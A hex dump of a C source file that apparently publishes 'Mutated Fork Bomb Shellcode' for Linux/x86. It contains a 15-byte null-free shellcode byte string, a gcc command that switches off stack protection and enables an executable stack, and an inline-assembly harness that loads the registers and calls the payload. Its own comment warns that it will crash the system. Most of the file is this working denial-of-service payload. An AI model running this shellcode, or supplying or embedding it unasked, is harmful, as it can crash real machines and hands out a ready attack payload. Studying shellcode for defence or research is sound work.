00000000  2f 2a 0a 0a 20 20 20 4d  75 74 61 74 65 64 20 46  |/*..   Mutated F|
00000010  6f 72 6b 20 42 6f 6d 62  20 53 68 65 6c 6c 63 6f  |ork Bomb Shellco|
00000020  64 65 20 2d 20 43 20 4c  61 6e 67 75 61 67 65 20  |de - C Language |
00000030  2d 20 4c 69 6e 75 78 2f  78 38 36 0a 20 20 20 43  |- Linux/x86.   C|
00000040  6f 70 79 72 69 67 68 74  20 28 43 29 20 32 30 31  |opyright (C) 201|
00000050  33 20 47 65 79 73 6c 61  6e 20 47 2e 20 42 65 6d  |3 Geyslan G. Bem|
00000060  2c 20 48 61 63 6b 69 6e  67 20 62 69 74 73 0a 0a  |, Hacking bits..|
00000070  20 20 20 68 74 74 70 3a  2f 2f 68 61 63 6b 69 6e  |   http://hackin|
00000080  67 62 69 74 73 2e 63 6f  6d 0a 20 20 20 67 65 79  |gbits.com.   gey|
00000090  73 6c 61 6e 40 67 6d 61  69 6c 2e 63 6f 6d 0a 0a  |slan@gmail.com..|
000000a0  20 20 20 54 68 69 73 20  70 72 6f 67 72 61 6d 20  |   This program |
000000b0  69 73 20 66 72 65 65 20  73 6f 66 74 77 61 72 65  |is free software|
000000c0  3a 20 79 6f 75 20 63 61  6e 20 72 65 64 69 73 74  |: you can redist|
000000d0  72 69 62 75 74 65 20 69  74 20 61 6e 64 2f 6f 72  |ribute it and/or|
000000e0  20 6d 6f 64 69 66 79 0a  20 20 20 69 74 20 75 6e  | modify.   it un|
000000f0  64 65 72 20 74 68 65 20  74 65 72 6d 73 20 6f 66  |der the terms of|
00000100  20 74 68 65 20 47 4e 55  20 47 65 6e 65 72 61 6c  | the GNU General|
00000110  20 50 75 62 6c 69 63 20  4c 69 63 65 6e 73 65 20  | Public License |
00000120  61 73 20 70 75 62 6c 69  73 68 65 64 20 62 79 0a  |as published by.|
00000130  20 20 20 74 68 65 20 46  72 65 65 20 53 6f 66 74  |   the Free Soft|
00000140  77 61 72 65 20 46 6f 75  6e 64 61 74 69 6f 6e 2c  |ware Foundation,|
00000150  20 65 69 74 68 65 72 20  76 65 72 73 69 6f 6e 20  | either version |
00000160  33 20 6f 66 20 74 68 65  20 4c 69 63 65 6e 73 65  |3 of the License|
00000170  2c 20 6f 72 0a 20 20 20  28 61 74 20 79 6f 75 72  |, or.   (at your|
00000180  20 6f 70 74 69 6f 6e 29  20 61 6e 79 20 6c 61 74  | option) any lat|
00000190  65 72 20 76 65 72 73 69  6f 6e 2e 0a 0a 20 20 20  |er version...   |
000001a0  54 68 69 73 20 70 72 6f  67 72 61 6d 20 69 73 20  |This program is |
000001b0  64 69 73 74 72 69 62 75  74 65 64 20 69 6e 20 74  |distributed in t|
000001c0  68 65 20 68 6f 70 65 20  74 68 61 74 20 69 74 20  |he hope that it |
000001d0  77 69 6c 6c 20 62 65 20  75 73 65 66 75 6c 2c 0a  |will be useful,.|
000001e0  20 20 20 62 75 74 20 57  49 54 48 4f 55 54 20 41  |   but WITHOUT A|
000001f0  4e 59 20 57 41 52 52 41  4e 54 59 3b 20 77 69 74  |NY WARRANTY; wit|
00000200  68 6f 75 74 20 65 76 65  6e 20 74 68 65 20 69 6d  |hout even the im|
00000210  70 6c 69 65 64 20 77 61  72 72 61 6e 74 79 20 6f  |plied warranty o|
00000220  66 0a 20 20 20 4d 45 52  43 48 41 4e 54 41 42 49  |f.   MERCHANTABI|
00000230  4c 49 54 59 20 6f 72 20  46 49 54 4e 45 53 53 20  |LITY or FITNESS |
00000240  46 4f 52 20 41 20 50 41  52 54 49 43 55 4c 41 52  |FOR A PARTICULAR|
00000250  20 50 55 52 50 4f 53 45  2e 20 20 53 65 65 20 74  | PURPOSE.  See t|
00000260  68 65 0a 20 20 20 47 4e  55 20 47 65 6e 65 72 61  |he.   GNU Genera|
00000270  6c 20 50 75 62 6c 69 63  20 4c 69 63 65 6e 73 65  |l Public License|
00000280  20 66 6f 72 20 6d 6f 72  65 20 64 65 74 61 69 6c  | for more detail|
00000290  73 2e 0a 0a 20 20 20 59  6f 75 20 73 68 6f 75 6c  |s...   You shoul|
000002a0  64 20 68 61 76 65 20 72  65 63 65 69 76 65 64 20  |d have received |
000002b0  61 20 63 6f 70 79 20 6f  66 20 74 68 65 20 47 4e  |a copy of the GN|
000002c0  55 20 47 65 6e 65 72 61  6c 20 50 75 62 6c 69 63  |U General Public|
000002d0  20 4c 69 63 65 6e 73 65  0a 20 20 20 61 6c 6f 6e  | License.   alon|
000002e0  67 20 77 69 74 68 20 74  68 69 73 20 70 72 6f 67  |g with this prog|
000002f0  72 61 6d 2e 20 20 49 66  20 6e 6f 74 2c 20 73 65  |ram.  If not, se|
00000300  65 20 3c 68 74 74 70 3a  2f 2f 77 77 77 2e 67 6e  |e <http://www.gn|
00000310  75 2e 6f 72 67 2f 6c 69  63 65 6e 73 65 73 2f 3e  |u.org/licenses/>|
00000320  2e 0a 0a 2a 2f 0a 0a 2f  2a 0a 0a 20 20 20 6d 75  |...*/../*..   mu|
00000330  74 61 74 65 64 5f 66 6f  72 6b 5f 62 6f 6d 62 5f  |tated_fork_bomb_|
00000340  73 68 65 6c 6c 63 6f 64  65 0a 0a 20 20 20 2a 20  |shellcode..   * |
00000350  31 35 20 62 79 74 65 73  0a 20 20 20 2a 20 6e 75  |15 bytes.   * nu|
00000360  6c 6c 2d 66 72 65 65 0a  20 20 20 2a 20 6d 75 74  |ll-free.   * mut|
00000370  61 74 65 64 20 69 73 6e  27 74 20 70 6f 6c 79 6d  |ated isn't polym|
00000380  6f 72 70 68 69 63 20 28  73 68 65 6c 6c 63 6f 64  |orphic (shellcod|
00000390  65 20 64 6f 65 73 20 6e  6f 74 20 72 65 70 6c 69  |e does not repli|
000003a0  63 61 74 65 20 69 74 73  65 6c 66 20 74 6f 20 62  |cate itself to b|
000003b0  65 20 63 61 6c 6c 65 64  20 70 6f 6c 79 6d 6f 72  |e called polymor|
000003c0  70 68 69 63 29 0a 0a 0a  20 20 20 23 20 67 63 63  |phic)...   # gcc|
000003d0  20 2d 6d 33 32 20 2d 66  6e 6f 2d 73 74 61 63 6b  | -m32 -fno-stack|
000003e0  2d 70 72 6f 74 65 63 74  6f 72 20 2d 7a 20 65 78  |-protector -z ex|
000003f0  65 63 73 74 61 63 6b 20  6d 75 74 61 74 65 64 5f  |ecstack mutated_|
00000400  66 6f 72 6b 5f 62 6f 6d  62 5f 73 68 65 6c 6c 63  |fork_bomb_shellc|
00000410  6f 64 65 2e 63 20 2d 6f  20 6d 75 74 61 74 65 64  |ode.c -o mutated|
00000420  5f 66 6f 72 6b 5f 62 6f  6d 62 5f 73 68 65 6c 6c  |_fork_bomb_shell|
00000430  63 6f 64 65 0a 0a 20 20  20 54 65 73 74 69 6e 67  |code..   Testing|
00000440  0a 20 20 20 2a 20 4f 6e  6c 79 20 72 75 6e 20 69  |.   * Only run i|
00000450  74 20 69 6e 20 61 20 56  69 72 74 75 61 6c 20 4d  |t in a Virtual M|
00000460  61 63 68 69 6e 65 21 21  21 20 59 6f 75 72 20 73  |achine!!! Your s|
00000470  79 73 74 65 6d 20 77 69  6c 6c 20 63 72 61 73 68  |ystem will crash|
00000480  2e 20 55 73 65 20 61 74  20 79 6f 75 72 20 6f 77  |. Use at your ow|
00000490  6e 20 72 69 73 6b 21 0a  0a 2a 2f 0a 0a 0a 23 69  |n risk!..*/...#i|
000004a0  6e 63 6c 75 64 65 20 3c  73 74 64 69 6f 2e 68 3e  |nclude <stdio.h>|
000004b0  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 72 69 6e  |.#include <strin|
000004c0  67 2e 68 3e 0a 0a 75 6e  73 69 67 6e 65 64 20 63  |g.h>..unsigned c|
000004d0  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 20  |har shellcode[] |
000004e0  3d 20 5c 0a 0a 20 20 20  20 20 20 20 20 20 20 20  |= \..           |
000004f0  20 20 20 22 5c 78 33 31  5c 78 66 66 5c 78 65 62  |   "\x31\xff\xeb|
00000500  5c 78 30 31 5c 78 65 38  5c 78 62 32 5c 78 31 64  |\x01\xe8\xb2\x1d|
00000510  5c 78 39 37 5c 78 38 33  5c 78 65 38 22 0a 20 20  |\x97\x83\xe8".  |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 31  |            "\x1|
00000530  62 5c 78 63 64 5c 78 38  30 5c 78 65 62 5c 78 66  |b\xcd\x80\xeb\xf|
00000540  31 22 3b 0a 0a 0a 6d 61  69 6e 20 28 29 0a 7b 0a  |1";...main ().{.|
00000550  0a 20 20 20 20 2f 2f 20  57 68 65 6e 20 63 6f 6e  |.    // When con|
00000560  74 61 69 6e 73 20 6e 75  6c 6c 20 62 79 74 65 73  |tains null bytes|
00000570  2c 20 70 72 69 6e 74 66  20 77 69 6c 6c 20 73 68  |, printf will sh|
00000580  6f 77 20 61 20 77 72 6f  6e 67 20 73 68 65 6c 6c  |ow a wrong shell|
00000590  63 6f 64 65 20 6c 65 6e  67 74 68 2e 0a 0a 20 20  |code length...  |
000005a0  20 20 70 72 69 6e 74 66  28 22 53 68 65 6c 6c 63  |  printf("Shellc|
000005b0  6f 64 65 20 4c 65 6e 67  74 68 3a 20 20 25 64 5c  |ode Length:  %d\|
000005c0  6e 22 2c 20 73 74 72 6c  65 6e 28 73 68 65 6c 6c  |n", strlen(shell|
000005d0  63 6f 64 65 29 29 3b 0a  0a 20 20 20 20 2f 2f 20  |code));..    // |
000005e0  50 6f 6c 6c 75 74 65 73  20 61 6c 6c 20 72 65 67  |Pollutes all reg|
000005f0  69 73 74 65 72 73 20 65  6e 73 75 72 69 6e 67 20  |isters ensuring |
00000600  74 68 61 74 20 74 68 65  20 73 68 65 6c 6c 63 6f  |that the shellco|
00000610  64 65 20 72 75 6e 73 20  69 6e 20 61 6e 79 20 63  |de runs in any c|
00000620  69 72 63 75 6d 73 74 61  6e 63 65 2e 0a 0a 20 20  |ircumstance...  |
00000630  20 20 5f 5f 61 73 6d 5f  5f 20 28 22 6d 6f 76 6c  |  __asm__ ("movl|
00000640  20 24 30 78 66 66 66 66  66 66 66 66 2c 20 25 65  | $0xffffffff, %e|
00000650  61 78 5c 6e 5c 74 22 0a  20 20 20 20 20 20 20 20  |ax\n\t".        |
00000660  20 20 20 20 22 6d 6f 76  6c 20 25 65 61 78 2c 20  |    "movl %eax, |
00000670  25 65 62 78 5c 6e 5c 74  22 0a 20 20 20 20 20 20  |%ebx\n\t".      |
00000680  20 20 20 20 20 20 22 6d  6f 76 6c 20 25 65 61 78  |      "movl %eax|
00000690  2c 20 25 65 63 78 5c 6e  5c 74 22 0a 20 20 20 20  |, %ecx\n\t".    |
000006a0  20 20 20 20 20 20 20 20  22 6d 6f 76 6c 20 25 65  |        "movl %e|
000006b0  61 78 2c 20 25 65 64 78  5c 6e 5c 74 22 0a 20 20  |ax, %edx\n\t".  |
000006c0  20 20 20 20 20 20 20 20  20 20 22 6d 6f 76 6c 20  |          "movl |
000006d0  25 65 61 78 2c 20 25 65  73 69 5c 6e 5c 74 22 0a  |%eax, %esi\n\t".|
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 22 6d 6f 76  |            "mov|
000006f0  6c 20 25 65 61 78 2c 20  25 65 64 69 5c 6e 5c 74  |l %eax, %edi\n\t|
00000700  22 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 6d  |".            "m|
00000710  6f 76 6c 20 25 65 61 78  2c 20 25 65 62 70 5c 6e  |ovl %eax, %ebp\n|
00000720  5c 74 22 0a 0a 20 20 20  20 20 20 20 20 20 20 20  |\t"..           |
00000730  20 2f 2f 20 43 61 6c 6c  69 6e 67 20 74 68 65 20  | // Calling the |
00000740  73 68 65 6c 6c 63 6f 64  65 0a 20 20 20 20 20 20  |shellcode.      |
00000750  20 20 20 20 20 20 22 63  61 6c 6c 20 73 68 65 6c  |      "call shel|
00000760  6c 63 6f 64 65 22 29 3b  0a 0a 7d                 |lcode");..}|
0000076b
